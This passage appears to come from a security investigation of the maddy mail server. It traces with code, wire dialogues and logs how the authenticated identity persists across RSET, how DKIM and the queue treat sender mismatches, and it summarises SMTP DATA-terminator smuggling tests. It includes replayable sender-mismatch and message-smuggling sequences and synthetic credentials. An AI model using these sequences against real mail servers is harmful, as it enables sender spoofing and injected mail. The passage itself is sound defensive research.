submission: 501 5.1.8 Non-local sender domain (msg ID = 36e559fe)
submission: 501 5.5.2 Bad command
submission: 501 5.5.2 Bad command
submission: 501 5.5.2 Bad command
```

### 4.6 Q1 stability

Every Q1 scenario above was run twice. In all cells the wire responses, the structured accept/reject sequence, the stored `.body` bytes, and the store-vs-no-store outcome are **identical run-to-run**; only the random `msg_id` and the client `src_ip` ephemeral port differ. The full run-to-run distribution is tabulated in §6.2.


## 5. Q2 — Authentication identity across transactions

### 5.1 Mechanism: identity is connection-scoped, set once, and survives `RSET`

The authenticated identity is written **exactly once**, when the session is created, and is never re-derived per transaction:

**`internal/endpoint/smtp/smtp.go` — `newSession` [smtp.go:L674-L682]:**
```go
func (endp *Endpoint) newSession(anonymous bool, username, password string, state *smtp.ConnectionState) smtp.Session {
	s := &Session{
		endp: endp,
		log:  endp.Log,
		connState: module.ConnState{
			ConnectionState: *state,
			AuthUser:        username,
			AuthPassword:    password,
		},
```
`AuthUser: username` [smtp.go:L680] is the *only* place the trusted identity is assigned. Now observe what `RSET` clears — and what it does not:

**maddy `Session.Reset`/`abort` [smtp.go:L60-L81]:**
```go
func (s *Session) Reset() {
	if s.delivery != nil {
		s.abort(s.msgCtx)
	}
	s.endp.Log.DebugMsg("reset")
}

func (s *Session) abort(ctx context.Context) {
	s.endp.semaphore.Release()
	if err := s.delivery.Abort(ctx); err != nil {
		s.endp.Log.Error("delivery abort failed", err)
	}
	s.log.Msg("aborted", "msg_id", s.msgMeta.ID)

	s.mailFrom = ""
	s.opts = smtp.MailOptions{}
	s.msgMeta = nil
	s.delivery = nil
	s.deliveryErr = nil
	s.msgCtx = nil
	s.msgTask.End()
}
```
`abort` zeroes `mailFrom` [smtp.go:L74], `opts` [smtp.go:L75], `msgMeta` [smtp.go:L76], `delivery` [smtp.go:L77], `deliveryErr` [smtp.go:L78], and `msgCtx` [smtp.go:L79] — the *in-flight transaction* — but there is **no assignment to `connState.AuthUser`** anywhere in `Reset`/`abort`. The `go-smtp` layer that invokes it is identical:

**`github.com/emersion/go-smtp/conn.go` — `reset` [conn.go:L694-L703]:**
```go
func (c *Conn) reset() {
	c.locker.Lock()
	defer c.locker.Unlock()

	if c.session != nil {
		c.session.Reset()
	}
	c.fromReceived = false
	c.recipients = nil
}
```
It clears `fromReceived` [conn.go:L701] and `recipients` [conn.go:L702] and calls `session.Reset()` [conn.go:L699]; it never touches the authenticated session. Finally, the command that begins the *next* transaction, `Session.Mail`, performs **no** comparison of the envelope sender against the authenticated identity:

**maddy `Session.Mail` [smtp.go:L162-L179]:**
```go
func (s *Session) Mail(from string, opts smtp.MailOptions) error {
	if !s.endp.deferServerReject {
		// Will initialize s.msgCtx.
		msgID, err := s.startDelivery(s.sessionCtx, from, opts)
		if err != nil {
			if err != context.DeadlineExceeded {
				s.log.Error("MAIL FROM error", err, "msg_id", msgID)
			}
			return s.endp.wrapErr(msgID, !opts.UTF8, err)
		}
	}

	// Keep the MAIL FROM argument for deferred startDelivery.
	s.mailFrom = from
	s.opts = opts

	return nil
}
```
`Mail` calls `startDelivery(s.sessionCtx, from, opts)` [smtp.go:L165] and stores `s.mailFrom = from` [smtp.go:L175] with no authorization check — which is exactly why `MAIL FROM:<userb>` after authenticating as `usera` is answered `250` at the command layer. The identity that *is* trusted downstream is still the pinned `connState.AuthUser`, surfaced in the acceptance log:

**maddy `startDelivery` acceptance-log branch [smtp.go:L127-L142]:**
```go
	if s.connState.AuthUser != "" {
		s.log.Msg("incoming message",
			"src_host", msgMeta.Conn.Hostname,
			"src_ip", msgMeta.Conn.RemoteAddr.String(),
			"sender", from,
			"msg_id", msgMeta.ID,
			"username", s.connState.AuthUser,
		)
	} else {
		s.log.Msg("incoming message",
			"src_host", msgMeta.Conn.Hostname,
			"src_ip", msgMeta.Conn.RemoteAddr.String(),
			"sender", from,
			"msg_id", msgMeta.ID,
		)
	}
```
When authenticated, the `incoming message` log carries a `username` field = `connState.AuthUser` [smtp.go:L133]; when not authenticated the field is omitted [smtp.go:L136-L141]. This single branch is why `username=usera@localhost` appears even on the mismatched (B) transaction, and why unauthenticated port-25 mail logs **no** `username` (§5.5).

### 5.2 Credentials used (synthetic throwaway) and the AUTH PLAIN decode

Because `io_debug` can log passwords (maddy warns of exactly this at [internal/endpoint/smtp/smtp.go:L605]), the credentials are **synthetic throwaway** values provisioned only in the scratch auth helper (§8.2): `usera@localhost / password123` (identity A) and `userb@localhost / password456` (identity B). The AUTH PLAIN token is the SASL PLAIN triple `authzid \x00 authcid \x00 passwd`; decoded from the wire it is `b'\x00usera@localhost\x00password123'` (base64 `AHVzZXJhQGxvY2FsaG9zdABwYXNzd29yZDEyMw==`), i.e. authcid `usera@localhost` — confirming the login identity is A.

### 5.3 Primary scenario: auth A -> MAIL A -> RSET -> MAIL B (no re-auth) -> DATA

This is the user's exact scenario. `MAIL FROM:<userb>` after the reset is accepted (`250 2.0.0 Roger, accepting mail from <userb@localhost>`) and the message is queued, yet **every in-memory consumer still sees A**. The seven identity artifacts (tabulated in §5.6) are all present in the captures below. Note in particular: the structured log's `username:"usera@localhost"` (A) beside `sender:"userb@localhost"` (B); the DKIM line `not signing, From address is not authenticated identity {"auth_id":"usera@localhost","from_addr":"userb@localhost"}` (A vs B); the `{auth_user}` capture `authuser=[usera@localhost]` (A); and the downstream sink's `DOWNSTREAM-AUTH raw-b64='AHVzZXJhQGxvY2FsaG9zdABwYXNzd29yZDEyMw==' decoded=b'\x00usera@localhost\x00password123'` (A relayed) while `DOWNSTREAM-MAIL MAIL FROM:<userb@localhost>` and the `Received`/`From` headers carry B.

**Run 1 — full captures:**
*Wire dialogue* (`mismatch_run1`):
```text
##### Q2 scenario=mismatch #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH PLAIN raw bytes: b'\x00usera@localhost\x00password123' b64: AHVzZXJhQGxvY2FsaG9zdABwYXNzd29yZDEyMw==
AUTH (usera): b'235 2.0.0 Authentication succeeded\r\n'
MAIL1 <usera>: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RSET: b'250 2.0.0 Session reset\r\n'
MAIL2 <userb> (no re-auth): b'250 2.0.0 Roger, accepting mail from <userb@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA: b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`mismatch_run1`):
```text
[debug] submission: reset	
submission: 250 2.0.0 Session reset
submission: incoming message	{"msg_id":"3cbce707","sender":"userb@localhost","src_host":"client.test","src_ip":"127.0.0.1:32896","username":"usera@localhost"}
submission: RCPT ok	{"msg_id":"3cbce707","rcpt":"dest@localhost"}
sign_dkim: not signing, From address is not authenticated identity	{"auth_id":"usera@localhost","from_addr":"userb@localhost","msg_id":"3cbce707"}
submission: accepted	{"msg_id":"3cbce707"}
[debug] submission: reset	
```
*`{auth_user}` external-check capture* (`mismatch_run1`):
```text
authuser=[usera@localhost]
```
*Downstream sink log (relayed SASL + data)* (`mismatch_run1`):
```text
=== SINK CONN 2026-07-08T05:44:53.414606 from ('127.0.0.1', 36556) ===
[2026-07-08T05:44:53.414606] <- EHLO localhost
[2026-07-08T05:44:53.414606] DOWNSTREAM-AUTH raw-b64='AHVzZXJhQGxvY2FsaG9zdABwYXNzd29yZDEyMw==' decoded=b'\x00usera@localhost\x00password123'
[2026-07-08T05:44:53.414606] DOWNSTREAM-MAIL MAIL FROM:<userb@localhost> BODY=8BITMIME
[2026-07-08T05:44:53.414606] DOWNSTREAM-RCPT RCPT TO:<dest@localhost>
[2026-07-08T05:44:53.414606] DOWNSTREAM-DATA (292 bytes):
[2026-07-08T05:44:53.414606] DATA| Received:  by localhost (envelope-sender <userb@localhost>) with ESMTP id
[2026-07-08T05:44:53.414606] DATA|  3cbce707; Wed, 08 Jul 2026 05:44:53 +0000
[2026-07-08T05:44:53.414606] DATA| Date: Wed, 8 Jul 2026 05:44:53 +0000
[2026-07-08T05:44:53.414606] DATA| Message-Id: <718c8245-3ac2-4c0d-9beb-d4b3f1c105df@localhost>
[2026-07-08T05:44:53.414606] DATA| From: <userb@localhost>
[2026-07-08T05:44:53.414606] DATA| To: <dest@localhost>
[2026-07-08T05:44:53.414606] DATA| Subject: q2
[2026-07-08T05:44:53.414606] DATA| 
[2026-07-08T05:44:53.414606] DATA| body line
[2026-07-08T05:44:53.414606] DATA| 
```
*Stored on-disk artifacts (`.header` / `.meta`)* (`mismatch_run1`):
```text
--- 3cbce707.header ---
Received:  by localhost (envelope-sender <userb@localhost>) with ESMTP id
 3cbce707; Wed, 08 Jul 2026 05:44:53 +0000
Date: Wed, 8 Jul 2026 05:44:53 +0000
Message-Id: <718c8245-3ac2-4c0d-9beb-d4b3f1c105df@localhost>
From: <userb@localhost>
To: <dest@localhost>
Subject: q2

--- 3cbce707.meta ---
{"MsgMeta":{"ID":"3cbce707","OriginalFrom":"userb@localhost","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"userb@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:44:52.808146224Z","LastAttempt":"2026-07-08T05:44:53.456797387Z"}
```
**Run 2 — full captures (identical behaviour; `msg_id`/`src_ip`/timestamps differ):**
*Wire dialogue* (`mismatch_run2`):
```text
##### Q2 scenario=mismatch #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH PLAIN raw bytes: b'\x00usera@localhost\x00password123' b64: AHVzZXJhQGxvY2FsaG9zdABwYXNzd29yZDEyMw==
AUTH (usera): b'235 2.0.0 Authentication succeeded\r\n'
MAIL1 <usera>: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RSET: b'250 2.0.0 Session reset\r\n'
MAIL2 <userb> (no re-auth): b'250 2.0.0 Roger, accepting mail from <userb@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA: b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`mismatch_run2`):
```text
[debug] submission: reset	
submission: 250 2.0.0 Session reset
submission: incoming message	{"msg_id":"b8b81ea9","sender":"userb@localhost","src_host":"client.test","src_ip":"127.0.0.1:36926","username":"usera@localhost"}
submission: RCPT ok	{"msg_id":"b8b81ea9","rcpt":"dest@localhost"}
sign_dkim: not signing, From address is not authenticated identity	{"auth_id":"usera@localhost","from_addr":"userb@localhost","msg_id":"b8b81ea9"}
submission: accepted	{"msg_id":"b8b81ea9"}
[debug] submission: reset	
```
*`{auth_user}` external-check capture* (`mismatch_run2`):
```text
authuser=[usera@localhost]
```
*Downstream sink log (relayed SASL + data)* (`mismatch_run2`):
```text
=== SINK CONN 2026-07-08T05:44:58.224952 from ('127.0.0.1', 41664) ===
[2026-07-08T05:44:58.224952] <- EHLO localhost
[2026-07-08T05:44:58.224952] DOWNSTREAM-AUTH raw-b64='AHVzZXJhQGxvY2FsaG9zdABwYXNzd29yZDEyMw==' decoded=b'\x00usera@localhost\x00password123'
[2026-07-08T05:44:58.224952] DOWNSTREAM-MAIL MAIL FROM:<userb@localhost> BODY=8BITMIME
[2026-07-08T05:44:58.224952] DOWNSTREAM-RCPT RCPT TO:<dest@localhost>
[2026-07-08T05:44:58.224952] DOWNSTREAM-DATA (292 bytes):
[2026-07-08T05:44:58.224952] DATA| Received:  by localhost (envelope-sender <userb@localhost>) with ESMTP id
[2026-07-08T05:44:58.224952] DATA|  b8b81ea9; Wed, 08 Jul 2026 05:44:58 +0000
[2026-07-08T05:44:58.224952] DATA| Date: Wed, 8 Jul 2026 05:44:58 +0000
[2026-07-08T05:44:58.224952] DATA| Message-Id: <6327fcc3-79d7-476d-9eaa-2653c51b24a4@localhost>
[2026-07-08T05:44:58.224952] DATA| From: <userb@localhost>
[2026-07-08T05:44:58.224952] DATA| To: <dest@localhost>
[2026-07-08T05:44:58.224952] DATA| Subject: q2
[2026-07-08T05:44:58.224952] DATA| 
[2026-07-08T05:44:58.224952] DATA| body line
[2026-07-08T05:44:58.224952] DATA| 
```
*Stored on-disk artifacts (`.header` / `.meta`)* (`mismatch_run2`):
```text
--- b8b81ea9.header ---
Received:  by localhost (envelope-sender <userb@localhost>) with ESMTP id
 b8b81ea9; Wed, 08 Jul 2026 05:44:58 +0000
Date: Wed, 8 Jul 2026 05:44:58 +0000
Message-Id: <6327fcc3-79d7-476d-9eaa-2653c51b24a4@localhost>
From: <userb@localhost>
To: <dest@localhost>
Subject: q2

--- b8b81ea9.meta ---
{"MsgMeta":{"ID":"b8b81ea9","OriginalFrom":"userb@localhost","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"userb@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:44:57.57790246Z","LastAttempt":"2026-07-08T05:44:58.266753381Z"}
```

### 5.4 The decisive split: identity is trusted in memory but NOT persisted to the queue

Q2 asks specifically about **queue metadata**. The answer is that the authenticated identity **A is present in memory throughout delivery** (used by the log, DKIM, `{auth_user}`, and SASL relay above) but is **deliberately stripped before the metadata is written to disk**. The queue nulls the connection state on the serialized copy:

**`internal/target/queue/queue.go` — `updateMetadataOnDisk` [queue.go:L742-L755]:**
```go
func (q *Queue) updateMetadataOnDisk(meta *QueueMetadata) error {
	metaPath := filepath.Join(q.location, meta.MsgMeta.ID+".meta")
	file, err := os.Create(metaPath + ".new")
	if err != nil {
		return err
	}
	defer file.Close()

	metaCopy := *meta
	metaCopy.MsgMeta = meta.MsgMeta.DeepCopy()
	metaCopy.MsgMeta.Conn = nil

	if err := json.NewEncoder(file).Encode(metaCopy); err != nil {
		return err
```
`metaCopy.MsgMeta.Conn = nil` [queue.go:L752] runs on a deep copy [queue.go:L751] *before* `json.NewEncoder(file).Encode(metaCopy)` [queue.go:L754]. The `ConnState` (which holds `AuthUser`) is therefore never JSON-encoded — consistent with the field's own contract:

**`internal/module/msgmetadata.go` — the `Conn` pointer and the serialization note [msgmetadata.go:L37-L41, L103-L104]:**
```go
	AuthUser string

	// If the client successfully authenticated using a username/password pair.
	// This field should be cleaned if the ConnState object is serialized
	AuthPassword string
```
```go
	// It can be nil for locally generated messages.
	Conn *ConnState
```
The comment `This field should be cleaned if the ConnState object is serialized` [msgmetadata.go:L40] governs `AuthPassword`, and `Conn *ConnState` `can be nil for locally generated messages` [msgmetadata.go:L103-L104]. The observed on-disk `.meta` (§5.3) confirms the effect exactly: `"Conn":null`, `"OriginalFrom":"userb@localhost"`, `"From":"userb@localhost"` — the **envelope B** is persisted, and the **authenticated A is absent**. A systemic check across the whole scratch queue confirms this is not scenario-specific: **every** queued `.meta` file has `"Conn":null` and **none** contains an `AuthUser`:
```text
$ find /tmp/maddy-scratch/queue /tmp/maddy-scratch/queue25 -name '*.meta' | wc -l
15

# How many queued .meta contain "Conn":null  (Conn nulled before encode -> queue.go:L752):
$ grep -l '"Conn":null' <all .meta> | wc -l   ; total .meta:
Conn-null: 15 / total: 15

# How many queued .meta contain the substring AuthUser (case-insensitive):
$ grep -li 'AuthUser' <all .meta> | wc -l
with-AuthUser: 0

# Representative .meta top-level keys (jq) — note absence of any auth field:
$ jq -r 'keys, .MsgMeta | keys' <one .meta>
top-level: ['FailedRcpts', 'FirstAttempt', 'From', 'LastAttempt', 'MsgMeta', 'RcptErrs', 'TemporaryFailedRcpts', 'To', 'TriesCount']
MsgMeta: ['Conn', 'DontTraceSender', 'ID', 'OriginalFrom', 'OriginalRcpts', 'Quarantine', 'SMTPOpts']
```
The `Received` header likewise records the **envelope** sender, not the login. `GenerateReceived(ctx, msgMeta, ourHostname, mailFrom)` [internal/target/received.go:L19] is called by `prepareBody` with `s.msgMeta.OriginalFrom` (the envelope) as `mailFrom` [internal/endpoint/smtp/smtp.go:L303], and writes the `(envelope-sender <` prefix followed by the address [internal/target/received.go:L69] — hence `Received: by localhost (envelope-sender <userb@localhost>)` in the captured `.header`. So both persisted artifacts (queue `.meta` and `Received`) attribute the message to **B**, while the live enforcement path attributed it to **A**.

### 5.5 Controls: proving each identity decision, and separating the two gates

**Control 1 — same identity (A authenticates, MAIL A, RSET, MAIL A, From A): DKIM SIGNS.** With no mismatch, `shouldSign` passes both guards and the signer emits `[debug] sign_dkim: signed {"identifier":"usera@localhost"}`; the stored `.header` carries a real `Dkim-Signature`. This is the positive control proving the mismatch decline in §5.3 is genuinely caused by the identity disagreement.

*Structured log lines* (`same_identity_run1`):
```text
[debug] submission: reset	
submission: 250 2.0.0 Session reset
submission: incoming message	{"msg_id":"43484236","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:36940","username":"usera@localhost"}
submission: RCPT ok	{"msg_id":"43484236","rcpt":"dest@localhost"}
[debug] sign_dkim: signed	{"identifier":"usera@localhost"}
submission: accepted	{"msg_id":"43484236"}
[debug] submission: reset	
```
*Stored on-disk artifacts (`.header` / `.meta`)* (`same_identity_run1`):
```text
--- 43484236.header ---
Dkim-Signature: a=rsa-sha256; bh
 =GVz/CG5ZsAtKynLk6yzbqFfB4F5h3X5ZmXt9rc6jZRI=; c=relaxed/relaxed;
 d=localhost;
 h=Subject:Subject:Sender:To:To:Cc:From:From:Date:Date:MIME-Version:Content-Type:Content-Transfer-Encoding:Reply-To:In-Reply-To:Message-Id:Message-Id:References:Autocrypt:Openpgp; i=usera@localhost; s=default; t=1783489502; v=1; x=1783921502; b=T3O90CSXzGEip56EwsQuhKmwyMGLe9P+mA6H/HD+RaHvvNn8cZptpRiCrCiKcAGAXXDiZySgXIU9eOSYBxaybfG5jNxh3XFR0eRCvlAAZRq5gVOHlJQygDLpdCjRoijvVRE06maHzuaBWsTloHEAaTblHj/q1uaPeCB5uk1F9maOqb628XrRjSgK0Tk3WltRyaEdafcCacSnsqa/GdEaTTcZfE81JlDlXf1pN+KIPoiG81K8kGgPU/XMQjC+Z7QX+EouBb5CGhtS3wQs4BeX0Um7iY/3NSuj3fqJud54vY7V7giIZzU/wIO9mEIm8Z7VVOXivS7dXcRxzLu+hS3TWw==;
Received:  by localhost (envelope-sender <usera@localhost>) with ESMTP id
 43484236; Wed, 08 Jul 2026 05:45:02 +0000
Date: Wed, 8 Jul 2026 05:45:02 +0000
Message-Id: <2ec51ced-3ee3-4a5e-b39c-e03128a15344@localhost>
From: <usera@localhost>
To: <dest@localhost>
Subject: q2

--- 43484236.meta ---
{"MsgMeta":{"ID":"43484236","OriginalFrom":"usera@localhost","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:45:02.382659388Z","LastAttempt":"2026-07-08T05:45:03.035081183Z"}
```
*Structured log lines* (`same_identity_run2`):
```text
[debug] submission: reset	
submission: 250 2.0.0 Session reset
submission: incoming message	{"msg_id":"3ac9d508","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:54140","username":"usera@localhost"}
submission: RCPT ok	{"msg_id":"3ac9d508","rcpt":"dest@localhost"}
[debug] sign_dkim: signed	{"identifier":"usera@localhost"}
submission: accepted	{"msg_id":"3ac9d508"}
[debug] submission: reset	
```
**Control 2 — anonymous on port 25 (no AUTH): NO identity is attached.** The `incoming message` log has **no** `username` field (the `else` branch at [smtp.go:L136-L141]), and the `{auth_user}` capture is empty. This is the negative control: without authentication there is simply no principal to pin.

*Wire dialogue* (`anon25_run1`):
```text
##### Q2 scenario=anon25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL <other> (no auth): b'250 2.0.0 Roger, accepting mail from <other@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA: b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`anon25_run1`):
```text
smtp: incoming message	{"msg_id":"7ce1e6a1","sender":"other@localhost","src_host":"client.test","src_ip":"127.0.0.1:54372"}
smtp: RCPT ok	{"msg_id":"7ce1e6a1","rcpt":"dest@localhost"}
smtp: accepted	{"msg_id":"7ce1e6a1"}
[debug] smtp: reset	
```
*`{auth_user}` external-check capture* (`anon25_run1`):
```text
(empty — no value captured)
```
*Structured log lines* (`anon25_run2`):
```text
smtp: incoming message	{"msg_id":"a16b2f23","sender":"other@localhost","src_host":"client.test","src_ip":"127.0.0.1:53092"}
smtp: RCPT ok	{"msg_id":"a16b2f23","rcpt":"dest@localhost"}
smtp: accepted	{"msg_id":"a16b2f23"}
[debug] smtp: reset	
```
*`{auth_user}` external-check capture* (`anon25_run2`):
```text
(empty — no value captured)
```
**Control 3 — envelope mismatch (auth A, MAIL B, header From A): a DIFFERENT DKIM decline.** Here the header `From` (A) disagrees with the *envelope* (B), so the **envelope** guard [dkim.go:L293-L296] fires first with `not signing, From address is not envelope address {"envelope":"userb@localhost","from_addr":"usera@localhost"}` — a distinct reason string from the auth-identity decline in §5.3. This proves the two `require_sender_match` sub-checks (`envelope` and `auth`) are independent.

*Structured log lines* (`envelope_mismatch_run1`):
```text
submission: incoming message	{"msg_id":"3f478420","sender":"userb@localhost","src_host":"client.test","src_ip":"127.0.0.1:59506","username":"usera@localhost"}
submission: RCPT ok	{"msg_id":"3f478420","rcpt":"dest@localhost"}
sign_dkim: not signing, From address is not envelope address	{"envelope":"userb@localhost","from_addr":"usera@localhost","msg_id":"3f478420"}
submission: accepted	{"msg_id":"3f478420"}
[debug] submission: reset	
```
*Structured log lines* (`envelope_mismatch_run2`):
```text
submission: incoming message	{"msg_id":"be47c0a7","sender":"userb@localhost","src_host":"client.test","src_ip":"127.0.0.1:59508","username":"usera@localhost"}
submission: RCPT ok	{"msg_id":"be47c0a7","rcpt":"dest@localhost"}
sign_dkim: not signing, From address is not envelope address	{"envelope":"userb@localhost","from_addr":"usera@localhost","msg_id":"be47c0a7"}
submission: accepted	{"msg_id":"be47c0a7"}
[debug] submission: reset	
```
**Control 4 — domain routing is a SEPARATE gate from DKIM.** When the post-`RSET` sender is a **non-local domain** (`userb@external.example`), the command layer still answers `250 2.0.0 Roger, accepting mail from <userb@external.example>` but the `default_source { reject 501 5.1.8 "Non-local sender domain" }` policy rejects at RCPT: `501 5.1.8 Non-local sender domain`, then `DATA` -> `502 5.5.1 Missing RCPT TO command.`. The structured log shows `RCPT error {"reason":"reject directive used","smtp_code":501,"smtp_enchcode":"5.1.8"}` and — importantly — the incoming-message line still pins `username:"usera@localhost"`. This is a gate on the envelope **domain**, orthogonal to the identity-mismatch signal, and it is the same policy that blocked the smuggled `evil@attacker.example` transaction on `:587` in §4.5.

*Wire dialogue* (`domain_reject_run1`):
```text
##### Q2 scenario=domain_reject #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH (usera): b'235 2.0.0 Authentication succeeded\r\n'
MAIL1 <usera>: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RSET: b'250 2.0.0 Session reset\r\n'
MAIL2 <userb@external.example> (no re-auth): b'250 2.0.0 Roger, accepting mail from <userb@external.example>\r\n'
RCPT: b'501 5.1.8 Non-local sender domain (msg ID = 6431df3b)\r\n'
DATA: b'502 5.5.1 Missing RCPT TO command.\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`domain_reject_run1`):
```text
[debug] submission: reset	
submission: 250 2.0.0 Session reset
submission: incoming message	{"msg_id":"6431df3b","sender":"userb@external.example","src_host":"client.test","src_ip":"127.0.0.1:38946","username":"usera@localhost"}
submission: RCPT error	{"effective_rcpt":"dest@localhost","rcpt":"dest@localhost","reason":"reject directive used","smtp_code":501,"smtp_enchcode":"5.1.8","smtp_msg":"Non-local sender domain"}
submission: 501 5.1.8 Non-local sender domain (msg ID = 6431df3b)
```
*Structured log lines* (`domain_reject_run2`):
```text
[debug] submission: reset	
submission: 250 2.0.0 Session reset
submission: incoming message	{"msg_id":"bf06dd7a","sender":"userb@external.example","src_host":"client.test","src_ip":"127.0.0.1:38948","username":"usera@localhost"}
submission: RCPT error	{"effective_rcpt":"dest@localhost","rcpt":"dest@localhost","reason":"reject directive used","smtp_code":501,"smtp_enchcode":"5.1.8","smtp_msg":"Non-local sender domain"}
submission: 501 5.1.8 Non-local sender domain (msg ID = bf06dd7a)
```

### 5.6 Which identity was trusted, per artifact (the full answer to Q2's named sub-parts)

Consolidating the captures above, the message that left as envelope **B** was attributed as follows. **In-memory / live-enforcement artifacts trust the authenticated principal A; persisted artifacts record the envelope B.**

| # | Artifact / decision point | Identity trusted | Observed value (mismatch scenario) | Source anchor |
|---|---------------------------|------------------|-------------------------------------|---------------|
| 1 | Acceptance log `username` field | **A** (auth) | `"username":"usera@localhost"` beside `"sender":"userb@localhost"` | [internal/endpoint/smtp/smtp.go:L133] |
| 2 | `{auth_user}` external-check placeholder | **A** (auth) | `authuser=[usera@localhost]` | [internal/check/command/command.go:L149] |
| 3 | DKIM signer (`require_sender_match` `auth`) | **A** (compared) | declines: `auth_id":"usera@localhost","from_addr":"userb@localhost"` | [internal/modify/dkim/dkim.go:L299-L309] |
| 4 | Downstream SASL credential relay (`auth forward`) | **A** (auth) | `decoded=b'\x00usera@localhost\x00password123'` | [internal/target/smtp_downstream/sasl.go:L41] |
| 5 | `Received` header | **B** (envelope) | `Received: by localhost (envelope-sender <userb@localhost>)` | [internal/target/received.go:L69] |
| 6 | Queue `.meta` (`OriginalFrom`/`From`); `Conn` nulled | **B** (envelope); A absent | `"OriginalFrom":"userb@localhost","Conn":null,"From":"userb@localhost"` | [internal/target/queue/queue.go:L752] |
| 7 | Domain-routing enforcement (`default_source reject`) | envelope **domain** | separate `501 5.1.8` only when domain non-local (Control 4) | [maddy.conf:L117-L118] |

So the answer to "does maddy reject it, tie it back to the original identity, or blur accountability?" is: it **ties every live decision back to the original identity A** (artifacts 1-4), **records the envelope B in the persisted trace** (artifacts 5-6), and **does not reject on the mismatch itself** — the default reaction is DKIM signature-withholding (artifact 3), while rejection only occurs on the independent envelope-domain gate (artifact 7). The one place accountability is genuinely blurred is **on disk**: the queue metadata cannot tell you which authenticated principal sent a message, because `AuthUser` is never serialized.

### 5.7 Q2 stability

Each of the five Q2 scenarios (mismatch + four controls) was run twice. The wire replies, the structured `username`/`sender` pairing, the DKIM decision (sign vs which decline reason), the `{auth_user}` capture, the relayed SASL identity, and the `.meta` `Conn:null`/`AuthUser`-absent invariant are **identical run-to-run**; only `msg_id`, `src_ip`, and timestamps vary. See the distribution in §6.2.


## 6. Coverage and stability

### 6.1 Coverage matrix — every named sub-part is answered

**Q1:**

| Named sub-part of Q1 | Answer | Evidence |
|----------------------|--------|----------|
| Stop at first dot / keep consuming / unexpected state? | **Stops** at first bare-dot line; does not keep consuming; no unexpected state | §4.2, §4.4 |
| What runtime signs show which path? | `354` prompt [conn.go:L510]; one `accepted` msg_id [smtp.go:L334]; `DATA error` with `"reason":"unexpected EOF"` on strict-fail | §4.1, §4.3 |
| What ends up stored/queued? | Only bytes before the first bare-dot line; leading-dot un-stuffed; CRLF -> LF | §4.2, §4.4 |
| Canonical `<CR><LF>.<CR><LF>` (both ports) | Accepted; 18-byte body | §4.2 |
| Bare `LF` `\n.\n` (both ports) | **Lenient** — terminates identically | §4.3 |
| Bare `CR` `\r.\r` (both ports) | **Strict** — never terminates; `554`; nothing stored | §4.3 |
| Mid-body bare dot + more data (user's example) | Stops; trailing lines become commands (`501 Bad command`) | §4.4 |
| Dot-stuffing (`..`) | One leading dot stripped per line | §4.4 |
| Trailing valid commands (smuggling) | Executed as new commands; 2nd message injected on `:25`; domain-gated on `:587` | §4.5 |
| Exact bytes for LF/CR variants | `od -c` + hex dumps | §4.3 |

**Q2:**

| Named sub-part of Q2 | Answer | Evidence |
|----------------------|--------|----------|
